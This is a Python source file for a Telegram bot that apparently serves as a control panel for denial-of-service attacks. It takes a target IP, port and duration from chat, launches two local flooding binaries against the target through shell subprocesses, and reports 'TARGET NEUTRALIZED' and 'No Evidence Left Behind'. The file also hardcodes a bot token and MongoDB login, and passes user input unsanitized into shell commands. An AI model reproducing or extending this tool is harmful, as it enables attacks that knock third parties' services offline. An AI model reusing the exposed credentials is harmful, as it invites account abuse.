import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

loop = asyncio.get_event_loop()

# Bot Configuration: Set with Authority
TOKEN = '8086042271:AAH89ims2kDFFTHoZMHhNx7b8-0rkeDPZfY'
ADMIN_USER_ID = 8086042271
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@GTX_GHOST"  # Immutable username for maximum security

# Attack Status Variable to Control Single Execution
attack_in_progress = False

# Logging for Precision Monitoring
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection - Operative Data Storage
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Operations
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack Initiation with Inline Buttons
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, {USERNAME}.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "💻 *Provide target details:*", parse_mode='Markdown')

        # Inline Keyboard for interactive input
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("Start Attack 🚀", callback_data="start_attack"),
            InlineKeyboardButton("Cancel ❌", callback_data="cancel_attack")
        )
        bot.send_message(chat_id, "⚙️ Choose an action:", reply_markup=markup)
    except Exception as e:
        logging.error(f"Attack command error: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ["start_attack", "cancel_attack"])
def handle_attack_callback(call):
    chat_id = call.message.chat.id
    if call.data == "start_attack":
        bot.send_message(chat_id, "✅ *Attack initiated! Provide IP, Port, and Duration.*", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, process_attack_command)
    elif call.data == "cancel_attack":
        bot.send_message(chat_id, "❌ *Attack canceled.*", parse_mode='Markdown')

# Run Subprocesses Simultaneously
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    try:
        # Run both commands simultaneously
        process_2111 = asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
        process_ranbal = asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
        await asyncio.gather(process_2111.communicate(), process_ranbal.communicate())
    except Exception as e:
        logging.error(f"Error during attack execution: {e}")
    finally:
        attack_in_progress = False
        notify_attack_finished(target_ip, target_port, duration)

# Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
        f"💣 *PORT BREACHED:* `{target_port}`\n"
        f"⏳ *DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
        parse_mode='Markdown'
    )

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "⚠️ Format: <IP> <Port> <Duration>", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 Port {target_port} restricted.", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f"🎯 *Attack initiated on {target_ip}:{target_port} for {duration} seconds!*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")

def start_asyncio_thread():
    asyncio.run(start_asyncio_loop())

if __name__ == "__main__":
    # Start asyncio thread
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    logging.info("🚀 Bot is operational and mission-ready.")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            
